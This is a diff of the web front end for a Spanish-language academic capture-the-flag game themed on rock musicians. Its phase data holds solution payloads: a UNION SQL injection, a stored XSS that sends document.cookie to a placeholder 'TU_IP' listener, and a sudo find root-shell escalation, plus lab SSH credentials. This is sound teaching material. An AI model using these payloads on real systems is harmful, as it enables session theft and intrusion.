-          <code>tshark -r jimi_hendrix.pcap -Y "http.request" -T fields -e http.user_agent | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code>
-        </div>
-      </div>
-
-      <!-- Inyección de Bandera Descubierta -->
-      <div class="flag-submission-box">
-        <h4>🏴 INYECTAR BANDERA DESCUBIERTA</h4>
-        <div style="font-size:11px; color:var(--text-muted); margin-bottom:8px;">
-          Ingresa la flag capturada en tu consola Kali Linux para deslizar el Slide metálico al siguiente traste:
-        </div>
-        <div class="flag-input-group">
-          <input type="text" id="flag-input" placeholder="FLAG{...}" autocomplete="off" spellcheck="false" onkeydown="if(event.key==='Enter') submitFlag()">
-          <button class="btn-submit-flag" onclick="submitFlag()">VALIDAR</button>
-        </div>
-        <div id="flag-feedback" class="flag-feedback"></div>
-      </div>
-    </div>
-  </aside>
-
   <!-- NOTIFICATION TOAST -->
   <div id="rock-toast">
-    <div class="toast-icon">⚡</div>
+    <div class="icon">⚡</div>
     <div>
-      <div class="toast-title" id="toast-title">¡FLAG CAPTURADA!</div>
-      <div class="toast-desc" id="toast-desc">El Slide metálico se desliza al Traste 6.</div>
+      <div class="title" id="toast-title">¡FLAG CAPTURADA!</div>
+      <div class="desc" id="toast-desc">El Slide se desliza al Traste 6.</div>
     </div>
   </div>
 
@@ -1346,8 +1041,8 @@
         </div>
       </div>
       <div style="display:flex; justify-content:center; gap:12px; margin-top:8px;">
-        <button class="btn-action demo-btn" onclick="execute100PercentDemo()">⚡ EJECUTAR DEMOSTRACIÓN 100%</button>
-        <button class="modal-close-btn" onclick="closeSustentacionModal()">CERRAR</button>
+        <button class="btn-top accent" onclick="execute100PercentDemo()">⚡ EJECUTAR DEMOSTRACIÓN 100%</button>
+        <button class="btn-top" onclick="closeSustentacionModal()">CERRAR</button>
       </div>
     </div>
   </div>
@@ -1355,89 +1050,56 @@
   <!-- AUDIO ELEMENT (MASTER RECORDINGS) -->
   <audio id="master-audio" preload="auto"></audio>
 
-  <!-- JAVASCRIPT MASTER ENGINE -->
+  <!-- JAVASCRIPT MASTER LOGIC -->
   <script>
-    // =========================================================================
-    // CTF METADATA & 27 FRETS LOGARITHMIC POSITIONING
-    // =========================================================================
     const TOTAL_FRETS = 27;
-
-    // Real Geometry on 1024 x 571 photograph:
-    // Nut (Traste 0): x=526, y=282
-    // Fret 27 (End of neck): x=358, y=347
-    const NUT_COORD = { x: 526, y: 282 };
-    const FRET27_COORD = { x: 358, y: 347 };
-
-    // Calculate fret positions using realistic guitar scale factor
-    const FRET_COORDINATES = [];
-    for (let i = 0; i <= TOTAL_FRETS; i++) {
-      if (i === 0) {
-        FRET_COORDINATES.push({ x: NUT_COORD.x, y: NUT_COORD.y, fret: 0 });
-      } else {
-        // Logarithmic spacing factor
-        const pct = (1 - Math.pow(0.963, i * 1.32)) / (1 - Math.pow(0.963, TOTAL_FRETS * 1.32));
-        const fx = NUT_COORD.x + (FRET27_COORD.x - NUT_COORD.x) * pct;
-        const fy = NUT_COORD.y + (FRET27_COORD.y - NUT_COORD.y) * pct;
-        FRET_COORDINATES.push({ x: Math.round(fx), y: Math.round(fy), fret: i });
-      }
-    }
 
     // Milestones Data
     const MILESTONES = {
       1: {
         fret: 6, name: "Jimi Hendrix", phase: 1, points: 150,
         title: "Fase 1: Jimi Hendrix Experience",
-        sub: "Traste 6 • Electric Church Studios",
-        photo: "assets/images/hendrix_photo.jpg",
-        albumCover: "assets/images/hendrix_album.jpg",
-        audio: "assets/audio/hendrix.m4a", trackTitle: "Purple Haze",
+        trackTitle: "Purple Haze",
+        audio: "assets/audio/hendrix.m4a",
         vector: "PCAP DPI / User-Agent Header", cwe: "ROT13 / CWE-311",
         target: "192.168.56.1 (Puerto 80 HTTP)",
-        kaliGuide: "<code>tshark -r jimi_hendrix.pcap -Y \"http.request\" -T fields -e http.user_agent | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code><br><br>Filtra las peticiones HTTP del PCAP y decodifica el User-Agent ROT13 para extraer la bandera."
+        kaliGuide: "tshark -r jimi_hendrix.pcap -Y \"http.request\" -T fields -e http.user_agent | tr 'A-Za-z' 'N-ZA-Mn-za-m'"
       },
       2: {
         fret: 11, name: "Janis Joplin", phase: 2, points: 200,
         title: "Fase 2: Janis Joplin Caravan",
-        sub: "Traste 11 • The Woodstock Caravan",
-        photo: "assets/images/joplin_photo.jpg",
-        albumCover: "assets/images/joplin_album.jpg",
-        audio: "assets/audio/joplin.m4a", trackTitle: "Cry Baby",
+        trackTitle: "Cry Baby",
+        audio: "assets/audio/joplin.m4a",
         vector: "Esteganografía Web EOF", cwe: "Información Sensible / CWE-200",
         target: "http://192.168.56.1/cry_baby/janis.jpg",
-        kaliGuide: "<code>strings janis.jpg | grep -i \"FLAG\"</code> o <code>binwalk -e janis.jpg</code><br><br>Extrae los bytes ocultos tras el marcador de fin de archivo JPEG (FF D9). ¡Cuidado con el señuelo en /admin_trampa/!"
+        kaliGuide: "strings janis.jpg | grep -i \"FLAG\" || binwalk -e janis.jpg"
       },
       3: {
         fret: 16, name: "Jim Morrison", phase: 3, points: 250,
         title: "Fase 3: The Doors Crypt / Vault",
-        sub: "Traste 16 • Las 3 Puertas de la Percepción",
-        photo: "assets/images/morrison_photo.jpg",
-        albumCover: "assets/images/morrison_album.jpg",
-        audio: "assets/audio/morrison.m4a", trackTitle: "Light My Fire",
+        trackTitle: "Light My Fire",
+        audio: "assets/audio/morrison.m4a",
         vector: "SQL Injection UNION Based", cwe: "Inyección SQL / CWE-89",
         target: "http://192.168.56.1/doors/?id=1",
-        kaliGuide: "<code>' UNION SELECT 1,group_concat(flag),3 FROM flag_vault-- -</code><br><br>Inyecta en el parámetro id para extraer la tabla confidencial. Evita la tabla trampa doors_trap."
+        kaliGuide: "' UNION SELECT 1,group_concat(flag),3 FROM flag_vault-- -"
       },
       4: {
         fret: 21, name: "Amy Winehouse", phase: 4, points: 200,
         title: "Fase 4: Camden Speakeasy & Jazz Club",
-        sub: "Traste 21 • Camden High Street Pub",
-        photo: "assets/images/winehouse_photo.jpg",
-        albumCover: "assets/images/winehouse_album.jpg",
-        audio: "assets/audio/winehouse.m4a", trackTitle: "Back To Black",
+        trackTitle: "Back To Black",
+        audio: "assets/audio/winehouse.m4a",
         vector: "Stored Cross-Site Scripting (XSS)", cwe: "Secuestro de Sesión / CWE-79",
         target: "http://192.168.56.1/winehouse/",
-        kaliGuide: "<code>&lt;script&gt;fetch('http://TU_IP:8000/?c='+document.cookie)&lt;/script&gt;</code><br><br>Inyecta payload en el libro de visitas y recibe la cookie admintoken en tu listener nc/python en Kali."
+        kaliGuide: "<scr" + "ipt>fetch('http://TU_IP:8000/?c='+document.cookie)</scr" + "ipt>"
       },
       5: {
         fret: 27, name: "Kurt Cobain", phase: 5, points: 200, isRoot: true,
         title: "Fase 5: Seattle Grunge Garage (Root)",
-        sub: "Traste 27 (Meta) • El Clavijero Dorado",
-        photo: "assets/images/cobain_photo.jpg",
-        albumCover: "assets/images/cobain_album.jpg",
-        audio: "assets/audio/cobain.m4a", trackTitle: "Smells Like Teen Spirit",
+        trackTitle: "Smells Like Teen Spirit",
+        audio: "assets/audio/cobain.m4a",
         vector: "SUID / GTFOBins Escalation", cwe: "Privilegios Indebidos / CWE-250",
         target: "SSH kurt@192.168.56.1:22 (grunge27)",
-        kaliGuide: "<code>sudo -l</code> verifica permisos sobre /usr/bin/find.<br><code>sudo find . -exec /bin/bash -p \\; -quit</code><br># whoami -> root | cat /root/flag.txt"
+        kaliGuide: "sudo find . -exec /bin/bash -p \\; -quit"
       }
     };
 
@@ -1445,7 +1107,7 @@
     const CTF_HASH_DB = {
       "5e92acd0d04435bfcd1301c88b1a6f10ff4e88ecca45213f1c89dc6649900aac": {
         phase: 1, type: "flag", name: "Jimi Hendrix", points: 150, nextPhase: 2,
-        msg: "¡PERÍMETRO VULNERADO! Tráfico C&C interceptado y decodificado exitosamente."
+        msg: "¡PERÍMETRO VULNERADO! Tráfico C&C interceptado y decodificado."
       },
       "2699e5b569fb12cc9c9d22d5e5648e2d686e5f7dec6f2a525359697308156b9c": {
         phase: 2, type: "flag", name: "Janis Joplin", points: 200, nextPhase: 3,
@@ -1485,7 +1147,7 @@
     const completedPhases = new Set();
     let isSoundMuted = false;
 
-    // Web Audio API Context
+    // Web Audio API
     let audioCtx = null;
     function getAudioContext() {
       if (!audioCtx) {
@@ -1497,11 +1159,7 @@
       return audioCtx;
     }
 
-    // =========================================================================
-    // SOUND EFFECTS (STEEL SLIDE GLISSANDO & BROKEN STRING SNAP)
-    // =========================================================================
-    
-    // 1. Realistic Steel Bottleneck Slide Glissando Sound
+    // Realistic Steel Slide Glissando Sound Effect
     function playSlideGlissando(startFret, endFret) {
       if (isSoundMuted) return;
       try {
@@ -1509,11 +1167,10 @@
         const now = ctx.currentTime;
         const duration = 0.72;
 
-        const baseFreq = 164.81; // Low E string frequency
+        const baseFreq = 164.81;
         const startFreq = baseFreq * Math.pow(2, startFret / 12);
         const endFreq = baseFreq * Math.pow(2, endFret / 12);
 
-        // Primary Dual Tones for Rich String Body Resonance
         const osc1 = ctx.createOscillator();
         const osc2 = ctx.createOscillator();
         osc1.type = "sawtooth";
@@ -1525,32 +1182,12 @@
         osc2.frequency.setValueAtTime(startFreq * 1.5, now);
         osc2.frequency.exponentialRampToValueAtTime(endFreq * 1.5, now + duration);
 
-        // Acoustic Resonant Filter
         const filter = ctx.createBiquadFilter();
         filter.type = "bandpass";
         filter.frequency.setValueAtTime(startFreq * 2.2, now);
         filter.frequency.exponentialRampToValueAtTime(endFreq * 2.2, now + duration);
         filter.Q.value = 6.0;
 
-        // String Friction Noise Generator (simulates slide friction against windings)
-        const bufferSize = ctx.sampleRate * duration;
-        const noiseBuffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
-        const output = noiseBuffer.getChannelData(0);
-        for (let i = 0; i < bufferSize; i++) {
-          output[i] = (Math.random() * 2 - 1) * 0.12;
-        }
-        const whiteNoise = ctx.createBufferSource();
-        whiteNoise.buffer = noiseBuffer;
-
-        const noiseFilter = ctx.createBiquadFilter();
-        noiseFilter.type = "highpass";
-        noiseFilter.frequency.value = 2200;
-
-        const noiseGain = ctx.createGain();
-        noiseGain.gain.setValueAtTime(0.08, now);
-        noiseGain.gain.exponentialRampToValueAtTime(0.001, now + duration);
-
-        // Master Gain Envelope
         const masterGain = ctx.createGain();
         masterGain.gain.setValueAtTime(0.0, now);
         masterGain.gain.linearRampToValueAtTime(0.35, now + 0.05);
@@ -1559,40 +1196,30 @@
         osc1.connect(filter);
         osc2.connect(filter);
         filter.connect(masterGain);
-
-        whiteNoise.connect(noiseFilter);
-        noiseFilter.connect(noiseGain);
-        noiseGain.connect(masterGain);
-
         masterGain.connect(ctx.destination);
 
         osc1.start(now);
         osc2.start(now);
-        whiteNoise.start(now);
-
         osc1.stop(now + duration);
         osc2.stop(now + duration);
-        whiteNoise.stop(now + duration);
       } catch (e) {
         console.warn("Audio Context error:", e);
       }
     }
 
-    // 2. Snapped String Sound (Broken String Snap + De-tension Twang)
+    // Broken String Snap Sound on error
     function playBrokenStringSound() {
       if (isSoundMuted) return;
       try {
         const ctx = getAudioContext();
         const now = ctx.currentTime;
 
-        // Flash Fender Amp Pilot Light
-        const pilot = document.getElementById("fender-pilot-light");
-        if (pilot) {
-          pilot.classList.add("fender-alert");
-          setTimeout(() => pilot.classList.remove("fender-alert"), 1200);
+        const jewel = document.getElementById("amp-jewel-lamp");
+        if (jewel) {
+          jewel.classList.add("snap-alert");
+          setTimeout(() => jewel.classList.remove("snap-alert"), 1200);
         }
 
-        // Violent High-Tension Snap
         const snapOsc = ctx.createOscillator();
         const snapGain = ctx.createGain();
         snapOsc.type = "sawtooth";
@@ -1605,7 +1232,6 @@
         snapOsc.connect(snapGain);
         snapGain.connect(ctx.destination);
 
-        // De-tension Detuned Twang
         const twangOsc = ctx.createOscillator();
         const twangGain = ctx.createGain();
         twangOsc.type = "triangle";
@@ -1619,24 +1245,10 @@
         twangOsc.connect(twangGain);
         twangGain.connect(ctx.destination);
 
-        // 60Hz Amp Valve Hum Burst
-        const humOsc = ctx.createOscillator();
-        const humGain = ctx.createGain();
-        humOsc.type = "sine";
-        humOsc.frequency.value = 60;
-        humGain.gain.setValueAtTime(0.3, now);
-        humGain.gain.exponentialRampToValueAtTime(0.001, now + 0.5);
-
-        humOsc.connect(humGain);
-        humGain.connect(ctx.destination);
-
         snapOsc.start(now);
         twangOsc.start(now + 0.04);
-        humOsc.start(now);
-
         snapOsc.stop(now + 0.08);
         twangOsc.stop(now + 0.75);
-        humOsc.stop(now + 0.55);
       } catch (e) {
         console.warn("Audio Context error:", e);
       }
@@ -1663,97 +1275,35 @@
       };
     }
 
-    // =========================================================================
-    // SLIDE MOVEMENT & POSITIONING ENGINE
-    // =========================================================================
+    // Move Slide to Fret on Diapasón
     function moveSlideToFret(targetFret) {
       const prevFret = currentFret;
       currentFret = Math.max(0, Math.min(TOTAL_FRETS, targetFret));
 
-      const targetCoord = FRET_COORDINATES[currentFret];
-      const slideEl = document.getElementById("chrome-slide");
-      const glowEl = document.getElementById("slide-glow");
+      const strip = document.getElementById("diapason-strip");
+      const slide = document.getElementById("diapason-slide");
+      if (!strip || !slide) return;
 
-      if (slideEl && targetCoord) {
-        slideEl.style.left = targetCoord.x + "px";
-        slideEl.style.top = targetCoord.y + "px";
-      }
-      if (glowEl && targetCoord) {
-        glowEl.style.left = targetCoord.x + "px";
-        glowEl.style.top = targetCoord.y + "px";
+      const items = strip.querySelectorAll(".fret-unit");
+      if (items[currentFret]) {
+        const itemCenter = items[currentFret].offsetLeft + items[currentFret].offsetWidth / 2;
+        slide.style.left = itemCenter + "px";
       }
 
-      // Update Macro Fretboard Bar Slide Indicator
-      updateMacroSlide(currentFret);
-
-      // Play Realistic Steel Slide Glissando Sound
       if (prevFret !== currentFret) {
         playSlideGlissando(prevFret, currentFret);
       }
 
       // Update HUD
-      const fretPosEl = document.getElementById("hud-fret-pos");
-      if (fretPosEl) {
-        fretPosEl.textContent = currentFret === 0 ? "TRASTE 0 (NUT)" : `TRASTE ${currentFret} / 27`;
-      }
+      document.getElementById("hud-fret-pos").textContent = currentFret === 0 ? "TRASTE 0 (NUT)" : `TRASTE ${currentFret} / 27`;
+      document.getElementById("fret-status-lbl").textContent = currentFret === 0 ? "PUNTO DE PARTIDA: TRASTE 0 (NUT)" : `POSICIÓN ACTUAL: TRASTE ${currentFret} DE 27`;
 
-      // Update active fret classes on hotspots
-      document.querySelectorAll(".fret-hotspot").forEach((el, idx) => {
-        el.classList.toggle("active-fret", idx === currentFret);
-      });
-      document.querySelectorAll(".fret-strip-item").forEach((el, idx) => {
-        el.classList.toggle("active-fret", idx === currentFret);
+      items.forEach((item, idx) => {
+        item.classList.toggle("active-fret", idx === currentFret);
       });
     }
 
-    // Update Macro Fretboard Bar Slide
-    function updateMacroSlide(fret) {
-      const strip = document.getElementById("macro-fretboard-strip");
-      const pill = document.getElementById("macro-slide-pill");
-      if (!strip || !pill) return;
-
-      const items = strip.querySelectorAll(".fret-strip-item");
-      if (items[fret]) {
-        const itemRect = items[fret].offsetLeft + items[fret].offsetWidth / 2;
-        pill.style.left = itemRect + "px";
-      }
-    }
-
-    // =========================================================================
-    // CAMERA CINEMATIC VIEWS
-    // =========================================================================
-    function switchCameraView(viewName) {
-      const wrap = document.getElementById("stage-canvas-wrap");
-      const buttons = document.querySelectorAll(".btn-view");
-      buttons.forEach(b => b.classList.remove("active"));
-
-      const activeBtn = Array.from(buttons).find(b => b.getAttribute("onclick")?.includes(viewName));
-      if (activeBtn) activeBtn.classList.add("active");
-
-      if (!wrap) return;
-
-      switch(viewName) {
-        case "room":
-          wrap.style.transform = "scale(1) translate(0px, 0px)";
-          break;
-        case "fret":
-          // Zoom into the Stratocaster on the bed
-          wrap.style.transform = "scale(2.5) translate(40px, -20px)";
-          break;
-        case "tv":
-          // Zoom into the vintage CRT television
-          wrap.style.transform = "scale(2.7) translate(-360px, -70px)";
-          break;
-        case "turntable":
-          // Zoom into the vintage turntable
-          wrap.style.transform = "scale(2.8) translate(30px, 140px)";
-          break;
-      }
-    }
-
-    // =========================================================================
-    // FLAG SUBMISSION & CRYPTOGRAPHIC VERIFICATION (SHA-256)
-    // =========================================================================
+    // SHA-256 Hash
     async function sha256Hex(str) {
       const buf = new TextEncoder().encode(str.trim());
       const hashBuf = await crypto.subtle.digest("SHA-256", buf);
@@ -1761,15 +1311,16 @@
       return hashArr.map(b => b.toString(16).padStart(2, "0")).join("");
     }
 
+    // Submit Flag
     async function submitFlag() {
       const input = document.getElementById("flag-input");
-      const feedback = document.getElementById("flag-feedback");
+      const feedback = document.getElementById("crt-feedback");
       if (!input || !feedback) return;
 
       const rawVal = input.value.trim();
       if (!rawVal) {
-        feedback.className = "flag-feedback error";
-        feedback.textContent = "Error: El campo de bandera no puede estar vacío.";
+        feedback.className = "crt-feedback-msg error";
+        feedback.textContent = "> ERROR: CAMPO VACÍO. INGRESA LA BANDERA CAPTURADA EN KALI.";
         playBrokenStringSound();
         return;
       }
@@ -1779,21 +1330,19 @@
 
       if (entry) {
         if (entry.type === "rabbit_hole") {
-          // Trap Triggered!
           score = Math.max(0, score - entry.penalty);
           updateTelemetryUI();
-          feedback.className = "flag-feedback error";
-          feedback.innerHTML = `⚠️ <strong>${entry.name}</strong><br>${entry.msg} Penalización: -${entry.penalty} PTS.`;
+          feedback.className = "crt-feedback-msg error";
+          feedback.innerHTML = `> ⚠️ ${entry.name.toUpperCase()}!<br>> ${entry.msg} (-${entry.penalty} PTS)`;
           playBrokenStringSound();
           showToast("⚠️ RABBIT HOLE ACTIVADO", entry.msg);
           return;
         }
 
         if (entry.type === "flag") {
-          // Valid Flag Captured!
           if (completedPhases.has(entry.phase)) {
-            feedback.className = "flag-feedback error";
-            feedback.textContent = `ℹ️ Ya habías capturado la bandera de la Fase ${entry.phase} (${entry.name}).`;
+            feedback.className = "crt-feedback-msg error";
+            feedback.textContent = `> INFORMACIÓN: YA HABÍAS CAPTURADO LA FASE ${entry.phase} (${entry.name.toUpperCase()}).`;
             return;
           }
 
@@ -1802,26 +1351,25 @@
           score += entry.points;
 
           const milestone = MILESTONES[entry.phase];
-          feedback.className = "flag-feedback success";
-          feedback.innerHTML = `✅ <strong>${entry.msg}</strong><br>+${entry.points} PTS • Bandera verificada criptográficamente (SHA-256).`;
+          feedback.className = "crt-feedback-msg success";
+          feedback.innerHTML = `> ✅ ¡ÉXITO! ${entry.msg}<br>> +${entry.points} PTS • CRIPTO SHA-256 VERIFICADA.`;
 
-          // Slide Glissando to the artist fret!
+          // 1. Slide glides to artist fret!
           moveSlideToFret(milestone.fret);
 
-          // Highlight vinyl on bed
-          const vinylEl = document.getElementById(`vinyl-${entry.phase}`);
-          if (vinylEl) vinylEl.classList.add("active-phase");
+          // 2. REVEAL AND UNLOCK VINYL COVER FOR THIS SPECIFIC FLAG!
+          unlockVinylSlot(entry.phase);
 
-          // Play Master Track
+          // 3. Play Master Track
           playMasterTrack(milestone.audio, `${milestone.name} - ${milestone.trackTitle}`);
 
-          // Show Toast
-          showToast(`⚡ ¡BANDERA FASE ${entry.phase} VERIFICADA!`, `Slide deslizándose al Traste ${milestone.fret} (${milestone.name})`);
+          // 4. Show Toast
+          showToast(`⚡ ¡FLAG FASE ${entry.phase} CAPTURADA!`, `Slide avanzando al Traste ${milestone.fret} (${milestone.name})`);
 
-          // Unlock fret styling
-          markFretsUpTo(milestone.fret);
+          // 5. Mark Diapasón Frets
+          markDiapasonFrets(milestone.fret);
 
-          // Advance to next phase if available
+          // 6. Advance next phase if available
           if (entry.nextPhase && entry.nextPhase <= 5) {
             selectPhase(entry.nextPhase);
           }
@@ -1830,60 +1378,51 @@
           input.value = "";
         }
       } else {
-        // Invalid Flag
-        feedback.className = "flag-feedback error";
-        feedback.innerHTML = "❌ Bandera inválida. No coincide con ningún artefacto de la fase. Cuerda rota (SNAP!).";
+        feedback.className = "crt-feedback-msg error";
+        feedback.innerHTML = "> ❌ BANDERA INVÁLIDA. CUERDA ROTA (SNAP!). REVISA EN KALI.";
         playBrokenStringSound();
-        showToast("❌ BANDERA INCORRECTA", "Revisa tus artefactos en Kali Linux. Cuerda rota.");
+        showToast("❌ BANDERA INCORRECTA", "No coincide con ningún artefacto de la fase.");
       }
     }
 
-    function markFretsUpTo(fret) {
-      document.querySelectorAll(".fret-hotspot").forEach((el, idx) => {
-        if (idx <= fret) el.classList.add("unlocked");
-      });
-      document.querySelectorAll(".fret-strip-item").forEach((el, idx) => {
-        if (idx <= fret) el.classList.add("unlocked-fret");
+    // Reveal Vinyl Cover when corresponding Flag is Captured
+    function unlockVinylSlot(phaseNum) {
+      const slot = document.getElementById(`slot-phase-${phaseNum}`);
+      const jacket = document.getElementById(`jacket-${phaseNum}`);
+      if (slot && jacket) {
+        slot.classList.add("unlocked");
+        jacket.classList.remove("locked");
+        jacket.classList.add("unlocked");
+      }
+      document.getElementById("showcase-counter").textContent = `${completedPhases.size} / 5 RESUELTOS`;
+    }
+
+    function markDiapasonFrets(fret) {
+      document.querySelectorAll(".fret-unit").forEach((item, idx) => {
+        if (idx <= fret) item.classList.add("unlocked-fret");
       });
     }
 
-    // =========================================================================
-    // PHASE SELECTION & UI UPDATES
-    // =========================================================================
+    // Select Phase
     function selectPhase(phaseNum) {
       activePhase = phaseNum;
       const m = MILESTONES[phaseNum];
       if (!m) return;
 
-      // Update Drawer UI
-      document.getElementById("drawer-photo").src = m.photo;
-      document.getElementById("drawer-title").textContent = m.title;
-      document.getElementById("drawer-traste-badge").textContent = `TRASTE ${m.fret} • ${m.points} PTS`;
-      document.getElementById("drawer-sub").textContent = m.sub;
-      document.getElementById("drawer-vector").textContent = m.vector;
-      document.getElementById("drawer-cwe").textContent = m.cwe;
-      document.getElementById("drawer-target").textContent = m.target;
-      document.getElementById("drawer-kali").innerHTML = m.kaliGuide;
-
-      // Update Phase Tab Buttons
-      for (let p = 1; p <= 5; p++) {
-        const tab = document.getElementById(`tab-p${p}`);
-        if (tab) tab.classList.toggle("active", p === phaseNum);
-      }
-
       // Update CRT Screen
-      document.getElementById("crt-phase-target").textContent = `> TARGET: ${m.target.split(' ')[0]}`;
-      document.getElementById("crt-cwe").textContent = `> ${m.cwe}`;
+      document.getElementById("crt-target-ip").textContent = m.target;
+      document.getElementById("crt-vector").textContent = m.vector;
+      document.getElementById("crt-cwe").textContent = m.cwe;
+      document.getElementById("crt-command").textContent = m.kaliGuide;
 
       // Update HUD
-      document.getElementById("hud-artist").textContent = `${m.name.toUpperCase()} (FASE ${phaseNum})`;
+      document.getElementById("hud-artist").textContent = `${phaseNum}. ${m.name.toUpperCase()}`;
 
-      // Update Real Vinyl Sleeves on Bed
+      // Update Slot Active Status
       for (let p = 1; p <= 5; p++) {
-        const sleeve = document.getElementById(`sleeve-phase-${p}`);
-        if (sleeve) {
-          sleeve.classList.toggle("active-phase", p === phaseNum);
-          sleeve.classList.toggle("completed-phase", completedPhases.has(p));
+        const slot = document.getElementById(`slot-phase-${p}`);
+        if (slot) {
+          slot.classList.toggle("active", p === phaseNum);
         }
       }
     }
@@ -1891,11 +1430,6 @@
     function updateTelemetryUI() {
       document.getElementById("hud-score").textContent = `${score} PTS`;
       document.getElementById("hud-flags").textContent = `${capturedFlagsCount} / 5`;
-    }
-
-    function toggleAttackDrawer() {
-      const drawer = document.getElementById("attack-drawer");
-      drawer.classList.toggle("open");
     }
 
     function showToast(title, desc) {
@@ -1911,7 +1445,6 @@
       showToast("🎸 AMPLIFICADOR FENDER", "Válvulas encendidas. Cable conectado a la Stratocaster.");
     }
 
-    // Sustentación Modal
     function openSustentacionModal() {
       document.getElementById("modal-sustentacion").classList.add("open");
     }
@@ -1919,7 +1452,6 @@
       document.getElementById("modal-sustentacion").classList.remove("open");
     }
 
-    // 100% Academic Demo for the Professor
     async function execute100PercentDemo() {
       closeSustentacionModal();
       showToast("🎓 INICIANDO DEMOSTRACIÓN 100%", "Inyectando las 5 banderas del CTF...");
@@ -1933,13 +1465,12 @@
       ];
 
       for (let i = 0; i < demoFlags.length; i++) {
-        await new Promise(r => setTimeout(r, 1400));
+        await new Promise(r => setTimeout(r, 1300));
         document.getElementById("flag-input").value = demoFlags[i];
         await submitFlag();
       }
     }
 
-    // Reset Progress
     function resetCTFProgress() {
       currentFret = 0;
       activePhase = 1;
@@ -1952,15 +1483,19 @@
       updateTelemetryUI();
 
       for (let p = 1; p <= 5; p++) {
-        const s = document.getElementById(`sleeve-phase-${p}`);
-        if (s) {
-          s.classList.remove("active-phase", "completed-phase");
+        const slot = document.getElementById(`slot-phase-${p}`);
+        const jacket = document.getElementById(`jacket-${p}`);
+        if (slot && jacket) {
+          slot.classList.remove("unlocked");
+          jacket.classList.add("locked");
+          jacket.classList.remove("unlocked");
         }
       }
-      const s1 = document.getElementById("sleeve-phase-1");
-      if (s1) s1.classList.add("active-phase");
-      document.querySelectorAll(".fret-hotspot").forEach(f => f.classList.remove("unlocked"));
-      document.querySelectorAll(".fret-strip-item").forEach(f => f.classList.remove("unlocked-fret"));
+      document.getElementById("showcase-counter").textContent = "0 / 5 RESUELTOS";
+
+      document.querySelectorAll(".fret-unit").forEach(item => {
+        item.classList.remove("unlocked-fret");
+      });
 
       const audio = document.getElementById("master-audio");
       audio.pause();
@@ -1968,80 +1503,56 @@
       document.getElementById("audio-eq").classList.remove("playing");
       document.getElementById("hud-track-title").textContent = "Sin Reproducción";
 
-      showToast("🔄 PROGRESO REINICIADO", "Slide vuelto al Traste 0 (Nut). ¡A la caza de banderas!");
+      showToast("🔄 PROGRESO REINICIADO", "Slide en Traste 0. Discos bloqueados.");
     }
 
-    // =========================================================================
-    // INITIALIZATION & DOM GENERATION
-    // =========================================================================
-    function initFretboardUI() {
-      // 1. Generate Fret Hotspots on the Real Photo
-      const container = document.getElementById("fret-nodes-container");
-      container.innerHTML = "";
+    // Build Diapasón Frets on load
+    function initDiapason() {
+      const strip = document.getElementById("diapason-strip");
+      strip.innerHTML = `
+        <div class="fret-string s1"></div>
+        <div class="fret-string s2"></div>
+        <div class="fret-string s3"></div>
+        <div class="fret-string s4"></div>
+        <div class="fret-string s5"></div>
+        <div class="fret-string s6"></div>
+        <div id="diapason-slide"></div>
+      `;
 
-      FRET_COORDINATES.forEach((coord, i) => {
-        const node = document.createElement("div");
-        node.className = `fret-hotspot ${i === 0 ? 'nut-hotspot' : ''}`;
-        node.style.left = coord.x + "px";
-        node.style.top = coord.y + "px";
-
-        // Check if it's a milestone fret
-        const milestoneKey = Object.keys(MILESTONES).find(k => MILESTONES[k].fret === i);
-        if (milestoneKey) {
-          node.classList.add("milestone");
-        }
-
-        const badge = document.createElement("span");
-        badge.className = "fret-badge";
-        badge.textContent = i === 0 ? "NUT" : `T${i}`;
-        node.appendChild(badge);
-
-        node.onclick = (e) => {
-          e.stopPropagation();
-          if (milestoneKey) {
-            selectPhase(parseInt(milestoneKey));
-            toggleAttackDrawer();
-          }
-        };
-
-        container.appendChild(node);
-      });
-
-      // 2. Generate Macro Fretboard Strip Items
-      const macroStrip = document.getElementById("macro-fretboard-strip");
       for (let i = 0; i <= TOTAL_FRETS; i++) {
-        const item = document.createElement("div");
-        item.className = `fret-strip-item ${i === 0 ? 'nut-fret' : ''}`;
+        const unit = document.createElement("div");
+        unit.className = `fret-unit ${i === 0 ? 'nut-fret' : ''}`;
 
         const milestoneKey = Object.keys(MILESTONES).find(k => MILESTONES[k].fret === i);
         if (milestoneKey) {
-          item.classList.add("milestone-fret");
-          const icon = document.createElement("span");
-          icon.className = "milestone-icon";
-          icon.textContent = "⭐";
-          item.appendChild(icon);
+          unit.classList.add("milestone-fret");
+          const star = document.createElement("span");
+          star.className = "milestone-star";
+          star.textContent = "⭐";
+          unit.appendChild(star);
         }
 
-        const numLbl = document.createElement("span");
-        numLbl.className = "fret-number-lbl";
-        numLbl.textContent = i === 0 ? "0" : i;
-        item.appendChild(numLbl);
+        const num = document.createElement("span");
+        num.className = "fret-num-text";
+        num.textContent = i === 0 ? "NUT" : i;
+        unit.appendChild(num);
 
-        item.onclick = () => {
+        unit.onclick = () => {
           if (milestoneKey) {
             selectPhase(parseInt(milestoneKey));
-            toggleAttackDrawer();
           }
         };
 
-        macroStrip.appendChild(item);
+        strip.appendChild(unit);
       }
 
-      // Initial Slide Placement at Nut (Traste 0)
-      moveSlideToFret(0);
-      selectPhase(1);
+      // Initial Slide placement
+      setTimeout(() => {
+        moveSlideToFret(0);
+        selectPhase(1);
+      }, 100);
 
-      // Sound mute toggle button
+      // Sound toggle
       document.getElementById("btn-toggle-sound").onclick = () => {
         isSoundMuted = !isSoundMuted;
         document.getElementById("btn-toggle-sound").textContent = isSoundMuted ? "🔇 UNMUTE" : "🔊 MUTE";
@@ -2051,7 +1562,7 @@
     }
 
     window.addEventListener("DOMContentLoaded", () => {
-      initFretboardUI();
+      initDiapason();
     });
   </script>
 </body>
